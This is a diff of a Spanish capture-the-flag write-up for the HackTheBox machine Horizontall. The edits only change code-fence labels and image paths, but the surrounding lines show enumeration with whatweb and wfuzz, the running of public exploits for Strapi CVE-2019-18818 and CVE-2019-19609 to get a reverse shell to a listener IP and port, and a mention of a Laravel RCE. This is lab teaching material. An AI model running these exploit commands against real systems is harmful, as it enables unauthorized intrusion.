@@ -106,7 +106,7 @@ Veamos con qué está construida la página web, para ello ejecutamos la herrami
 any0ne@Pentesting:~$ echo '10.10.11.105 horizontall.htb' | sudo tee -a /etc/hosts
 ```
 
-```
+```console
 any0ne@Pentesting:~$ whatweb http://horizontall.htb/
 
 http://horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
@@ -121,7 +121,7 @@ Primero usando un diccionario pequeño y si no encontramos nada usaremos uno má
 | -w        | Utiliza el diccionario especificado |
 | --hc=404  | Oculta todos los códigos de estado 404 |
 
-```
+```console
 any0ne@Pentesting:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://horizontall.htb/FUZZ 2>/dev/null
 
 ********************************************************
@@ -193,19 +193,19 @@ any0ne@Pentesting:~$ echo '10.10.11.105 api-prod.horizontall.htb' | sudo tee -a 
 
 Echemos un vistazo a este subdominio:
 
-![api-prod](/assets/images/htb-horizontall/api-prod1.png)
+![api-prod](/assets/images/horizontall/api-prod1.png)
 
 Vemos un mensaje de bienvenida y ninguna información adicional así que probamos a añadirle **`/admin`** como subdirectorio.
 
-![api-prod](/assets/images/htb-horizontall/api-prod2.png)
+![api-prod](/assets/images/horizontall/api-prod2.png)
 
 Tenemos un panel de acceso para administradores de la API gestionado por **`strapi`**, comprobemos qué versión se está utilizando.
 
-![Strapi Version](/assets/images/htb-horizontall/strapi_version.png)
+![Strapi Version](/assets/images/horizontall/strapi_version.png)
 
 Realizando una búsqueda rápida en Google encontramos que esta versión es vulnerable a [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html)
 
-![Strapi Vulnerability](/assets/images/htb-horizontall/strapi_vuln.png)
+![Strapi Vulnerability](/assets/images/horizontall/strapi_vuln.png)
 
 Nos descargamos el [exploit](https://www.exploit-db.com/exploits/50239) y lo ejecutamos siguiendo las intrucciones:
 
@@ -213,11 +213,11 @@ Nos descargamos el [exploit](https://www.exploit-db.com/exploits/50239) y lo eje
 any0ne@Pentesting:~$ python3 exploit-CVE-2019-18818.py http://api-prod.horizontall.htb/
 ```
 
-![Strapi Exploited](/assets/images/htb-horizontall/strapi_exploit.png)
+![Strapi Exploited](/assets/images/horizontall/strapi_exploit.png)
 
 Ahora que tenemos acceso como administrador, vamos a iniciar sesión y ver qué nos encontramos.
 
-![Strapi Admin](/assets/images/htb-horizontall/strapi_admin.png)
+![Strapi Admin](/assets/images/horizontall/strapi_admin.png)
 
 De nuevo buscando por Google acerca de esta vulnerabilidad en Strapi, averiguamos que es posible obtener una shell inversa.
 Para ello necesitamos el token **`JWT`** pero afortunadamente el exploit anterior ya nos proporcionó dicho token.
@@ -227,11 +227,11 @@ Vamos a utilizar [otro exploit](https://github.com/diego-tella/CVE-2019-19609-EX
 any0ne@Pentesting:~$  python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM5OTQ2MDQwLCJleHAiOjE2NDI1MzgwNDB9.Mqaypv9YCdphfV10JvjPU_9mfw7jI_YYgL5hAAOIRL8 -l 10.10.14.253 -p 9999
 ```
 
-![Strapi Shell](/assets/images/htb-horizontall/got_shell.png)
+![Strapi Shell](/assets/images/horizontall/got_shell.png)
 
 Ejecutamos **`whoami`** para ver qué usuario somos en el sistema, luego nos movemos hasta **`/home/developer/`** y tenemos la flag de usuario en **`user.txt`**
 
-![User Flag](/assets/images/htb-horizontall/flag_user.png)
+![User Flag](/assets/images/horizontall/flag_user.png)
 
 Investigando un poco por los directorios del sistema, descubro un archivo **`database.json`**:
 
@@ -351,7 +351,7 @@ $
 
 Abrimos en el navegador la URL **`http://localhost:8000/`** y vemos un panel Laravel vulnerable a [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html) bajo la vulnerabilidad **`CVE-2021-3129`**
 
-![Laravel Panel](/assets/images/htb-horizontall/laravel_panel.png)
+![Laravel Panel](/assets/images/horizontall/laravel_panel.png)
 
 Por suerte encontrar el exploit es bastante sencillo así que lo descargamos y lo ejecutamos.
 
